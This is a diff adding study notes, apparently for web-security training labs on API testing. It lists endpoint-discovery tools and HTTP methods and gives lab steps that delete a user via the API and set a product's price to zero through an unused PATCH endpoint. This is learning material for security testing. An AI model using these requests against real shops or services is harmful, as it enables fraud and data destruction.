@@ -22,3 +22,24 @@ Application Programming Interfaces
    ```
 3. Try `GET /api/user/carlos`
 4.  `DELETE /api/user/carlos `
+### Identifying API Endpoints
+**xnLinkFinder**
+**GoLinkFinder EVO**
+**JSHunter**
+**Rac-Js**
+**ShadowJS**
+**Katana**
+**GAU**
+My custom script katana + parsing
+#### HTTP methods
+- `GET` - Retrieves data from a resource.
+- `PATCH` - Applies partial changes to a resource.
+- `OPTIONS` - Retrieves information on the types of request methods that can be used on a resource.
+**Note**: To change the content type, modify the `Content-Type` header, then reformat the request body accordingly
+#### Lab: Finding and exploiting an unused API endpoint
+1. find `/api/products/1/price` and send to repeater
+2. add `Content-Type: application/json`
+3. ```
+   PATCH /api/products/1/price
+   {"price":0,"message":"This item is in high demand - 6 purchased in the last 1h"}
+   ```
